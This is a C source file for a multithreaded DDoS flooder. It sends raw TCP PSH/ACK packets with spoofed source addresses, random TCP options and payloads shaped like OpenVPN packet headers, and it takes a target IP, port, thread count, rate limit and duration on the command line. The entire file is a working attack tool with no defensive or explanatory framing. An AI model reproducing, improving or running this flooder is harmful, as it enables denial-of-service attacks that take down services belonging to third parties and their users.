#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
#define MAX_PAYLOAD_SIZE 1400
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

static const char PAYLOAD[] = "ing.....V\xact\x01\xa3n\x145\xd7I0\xe0e\xce\xab/\x92$\xc4\x9e\xf1\xf5\xe4O\x80\xec\xb0:\x97U-\xee\x01\xa1\xef\xa5\x10\x03\xda\xe7L\x0a\xc7\xb1\xd8s\xe0j\x97\xa4\x08\x89\x99\xec\xd8\x1a\xd9\x88Tp\xdd\x81^\xdf#M\x843P^\x1a\x9ch\xe2M@U.\xaa\xec\xd2\xb2ul\x9fM\x86x\xd6\xda\xe8\xb3[G\x92~\x94\x16\xb1\xe5t\xcc\x81\xdc\xae\xcf\x1c\x03\xfd\xc6\xef\xcfye;\x18\xb2\xc1\x90\x88\x9bx<\xf7\xbf\xceuT\xe5'9Y\xf3\xba6\xa1\x89R\xa4\x86\x19\x93V\x92\xf8\x91T\x9c9\x90Z\xc3\xae_\xb2\xa1\xcdU\x00\x00\xaa\xf7\xfa\x13vF\xab\x00\x00\xf38\xf8\xd2\xa83\x9d\x0c\xcd1]\xc2\xec\x1e\x98P3\x17\x89\xcdU\x00\x00\xd0-\x00p\xfc\x7f\x00\x00\x80\x15\x17\x89\xcdU\x00\x00\xc0.\x00p\xfc\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd73\xa8\x1d\xc8\x7f\x00\x00\xd0-";
/**
 * OVPN data: byte 0-1: packet len
 * 			  byte 2: 0x38 opcode
 * 			  byte 3-10: Session Id
 * 			  byte 11: Array len = 0
 * 			  byte 12-15: packetID
 * 		      byte 15- :data
 */
static const char APPLICATION_DATA[] = "\x00\x0f\x0b\x8b\xeb\x00\x00\x00\x01\xa2\x06\x99\x1c\xf4\x02\xa1\xbc\xa9\xe4\xe7\x85\xfb\x7f\xd4\xa4\x10\x1c\xa3";

struct tcpopts
{
	uint8_t kind;
	uint8_t length;
	uint8_t data[6];
};
void init_rand(unsigned long int x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++)
	{
		Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
	}
}

unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c)
	{
		x++;
		c++;
	}
	return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
	int result = 0, low_num = 0, hi_num = 0;

	if (min_num < max_num)
	{
		low_num = min_num;
		hi_num = max_num + 1;
	}
	else
	{
		low_num = max_num + 1;
		hi_num = min_num;
	}

	result = (rand_cmwc() % (hi_num - low_num)) + low_num;
	return result;
}

unsigned short csum(unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while (count > 1)
	{
		sum += *buf++;
		count -= 2;
	}

	if (count > 0)
	{
		sum += *(unsigned char *)buf;
	}

	while (sum >> 16)
	{
		sum = (sum & 0xffff) + (sum >> 16);
	}

	return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int payloadLen)
{
	struct tcp_pseudo
	{
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	}

	pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr = iph->saddr;
	pseudohead.dst_addr = iph->daddr;
	pseudohead.zero = 0;
	pseudohead.proto = IPPROTO_TCP;
	pseudohead.length = htons(sizeof(struct tcphdr) + payloadLen);
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + payloadLen;
	unsigned short *tcp = malloc(totaltcp_len);
	if (!tcp)
	{
		perror("malloc failed");
		exit(-1);
	}
	memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + payloadLen);
	unsigned short output = csum(tcp, totaltcp_len);
	free(tcp);
	return output;
}

void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + sizeof(PAYLOAD) - 1;
	iph->id = htonl(54321);
	iph->frag_off = htons(0x4000);
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	iph->saddr = inet_addr("0.0.0.0");
}

void setup_tcp_header(struct tcphdr *tcph, struct tcpopts *opts)
{
	tcph->source = htons(5678);
	tcph->check = 0;
	tcph->psh = 1;
	tcph->ack = 1;
	tcph->urg = 0;
	tcph->ack_seq = randnum(10000, 99999);
	tcph->urg_ptr = 0;
	tcph->window = htons(64240);
	tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpopts)) / 4;
	memcpy((void *)tcph + sizeof(struct tcphdr), opts, sizeof(struct tcpopts));
}

void setupTcpOpts(struct tcpopts *opts)
{
	opts->kind = 0x70;
	opts->length = 0x80;
	opts->data[randnum(0, sizeof(opts->data))] = 0x01;
}

char *generateNewPayload(int size, int specialPayload)
{

	char *newPayload = malloc(size);
	for (int i = 0; i < size; i++)
	{
		newPayload[i] = rand_cmwc() % 256;
	}
	if (specialPayload == 1)
	{

		for (int i = 0; i < 8; i++)
		{
			newPayload[i] = PAYLOAD[i];
		}
		for (int i = 8; i < size; i++)
		{
			newPayload[i] = rand_cmwc() % 256;
		}
		return newPayload;
	}
	else
	{

		int type = randnum(0, 2);
		if (type == 0)
		{
			/**
			 * Calculate actual data size by subtracting the size of the OVPN header of the payloadsize
			 */
			int dataSize = size - 2;

			/*
			Fill ovpn header
			*/
			newPayload[0] = (dataSize >> 8) & 0xFF;
			newPayload[1] = dataSize & 0xFF;
			newPayload[2] = 0x38;
			/**
			 * Fill session ID
			 */
			for (int i = 3; i < 11; i++)
			{
				newPayload[i] = rand_cmwc() % 256;
			}
			newPayload[11] = 0x00;
			/**
			 * Packet ID
			 */
			for (int i = 12; i < 16; i++)
			{
				newPayload[i] = rand_cmwc() % 256;
			}
			/**
			 * Add random data
			 */

			for (int i = 16; i < dataSize; i++)
			{
				newPayload[i] = rand_cmwc() % 256;
			}
		}
		else if (type == 1)
		{

			/**
			 * P_ACK is smaller than hardReset_v2
			 */

			int dataSize = size - 2;

			newPayload[0] = (dataSize >> 8) & 0xFF;
			newPayload[1] = dataSize & 0xFF;
			newPayload[2] = 0x28;
			for (int i = 3; i < 11; i++)
			{
				newPayload[i] = rand_cmwc() % 256;
			}
			newPayload[11] = 0x00;
			for (int i = 12; i < dataSize; i++)
			{
				newPayload[i] = rand_cmwc() % 256;
			}
		}

		else if (type == 2)
		{
			/*
			P_Data has the smallest header but the most data
			*/
			int dataSize = size - 2;

			newPayload[0] = (dataSize >> 8) & 0xFF;
			newPayload[1] = dataSize & 0xFF;
			newPayload[2] = 0x48;
			for (int i = 3; i < 7; i++)
			{
				newPayload[i] = 0x00;
			}
			for (int i = 8; i < dataSize; i++)
			{
				newPayload[i] = rand_cmwc() % 256;
			}
		}
		return newPayload;
	}
}
char *optsData()
{
	char *newOptData = malloc(6);
	newOptData[0] = 0x6e;
	newOptData[1] = 0x67;
	newOptData[2] = 0x2e;
	newOptData[3] = 0x2e;
	newOptData[4] = 0x2e;
	newOptData[5] = 0x70;

	return newOptData;
}
void *flood(void *par1)
{
	char *td = (char *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
	struct tcpopts *opts = (void *)iph + sizeof(struct iphdr) + sizeof(struct tcphdr);
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(floodport);
	sin.sin_addr.s_addr = inet_addr(td);
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if (s < 0)
	{
		perror("Could not open raw socket");
		exit(-1);
	}

	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setupTcpOpts(opts);
	setup_tcp_header(tcph, opts);
	tcph->dest = htons(floodport);
	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum((unsigned short *)datagram, iph->tot_len);
	int tmp = 1;
	const int *val = &tmp;
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
	{
		perror("Error: setsockopt() - Cannot set HDRINCL");
		exit(-1);
	}

	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	int urgPtrs[4] = {6025, 20504, 44377};
	while (1)
	{

		uint8_t first_octet_options[16] = {151, 188, 37, 51, 176, 5, 92, 172, 8, 198, 192, 155, 140, 144, 55, 132};
		uint8_t second_octet_options[16] = {80, 165, 187, 89, 31, 196, 222, 64, 46, 41, 112, 155, 1, 170, 32, 128};
		uint8_t third_octet_options[8] = {1, randnum(1, 255), 255, 113, 8, 36, 128, 192};
		uint8_t fourth_octet_options[8] = {1, randnum(1, 255), 255, 4, 6, 32, 64, 16};
		uint8_t first_octet = first_octet_options[randnum(0, 15)];
		uint8_t second_octet = second_octet_options[randnum(0, 15)];
		uint8_t third_octet = third_octet_options[randnum(0, 7)];
		uint8_t fourth_octet = fourth_octet_options[randnum(0, 7)];

		int newPayloadLen = randnum(256, 1024);

		int sendOptions = randnum(0, 1);

		tcph->check = 0;
		tcph->dest = htons(floodport);
		iph->id = htons(rand_cmwc() & 0xFFFF);
		tcph->source = htons(randnum(1, 65535));
		tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFF);
		tcph->ack_seq = randnum(10000, 99999);
		iph->ttl = randnum(64, 128);
		iph->saddr = (fourth_octet << 24) | (third_octet << 16) | (second_octet << 8) | (first_octet);

		char *newPayload;

		if (sendOptions == 1)
		{
			setupTcpOpts(opts);
			char *dataPayload = optsData();
			memcpy(opts->data, dataPayload, 6);
			newPayload = generateNewPayload(newPayloadLen, sendOptions);
			tcph->urg_ptr = htons(urgPtrs[randnum(0, 2)]);
			memcpy((void *)tcph + (sizeof(struct tcphdr) + sizeof(struct tcpopts)), newPayload, newPayloadLen);
			tcph->doff = (sizeof(struct tcphdr) + sizeof(struct tcpopts)) / 4;
			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + newPayloadLen;
			iph->check = csum((unsigned short *)datagram, iph->tot_len);
			tcph->check = tcpcsum(iph, tcph, newPayloadLen + sizeof(struct tcpopts));
			free(dataPayload);
		}
		else
		{
			newPayload = generateNewPayload(newPayloadLen, sendOptions);
			tcph->urg_ptr = htons(0);
			memcpy((void *)tcph + (sizeof(struct tcphdr)), newPayload, newPayloadLen);
			tcph->doff = 5;
			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + newPayloadLen;
			iph->check = csum((unsigned short *)datagram, iph->tot_len);
			tcph->check = tcpcsum(iph, tcph, newPayloadLen);
		}

		if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
		{
			perror("Error: sendto failed");
		}
		tcph->window = htons(randnum(8192, 65320));
		pps++;
		if (i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}

		i++;
	}
}

int main(int argc, char *argv[])
{
	if (argc < 6)
	{
		fprintf(stderr, "Usage: %s <target IP> <port> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
		exit(-1);
	}
	srand((unsigned int)time(NULL));
	fprintf(stdout, "Setting up Sockets...\n");
	int num_threads = atoi(argv[3]);
	floodport = atoi(argv[2]);
	int maxpps = atoi(argv[4]);
	limiter = 0;
	pps = 0;
	pthread_t thread[num_threads];
	int multiplier = 12;
	int i;

	for (i = 0; i < num_threads; i++)
	{
		if (pthread_create(&thread[i], NULL, &flood, (void *)argv[1]) != 0)
		{
			perror("Error: pthread_create failed");
			exit(-1);
		}
	}

	fprintf(stdout, "Starting Flood...\n");
	for (i = 0; i < (atoi(argv[5]) * multiplier); i++)
	{
		usleep((1000 / multiplier) * 1000);
		if ((pps * multiplier) > maxpps)
		{
			if (1 > limiter)
			{
				sleeptime += 100;
			}
			else
			{
				limiter--;
			}
		}
		else
		{
			limiter++;
			if (sleeptime > 25)
			{
				sleeptime -= 25;
			}
			else
			{
				sleeptime = 0;
			}
		}

		pps = 0;
	}

	return 0;
}
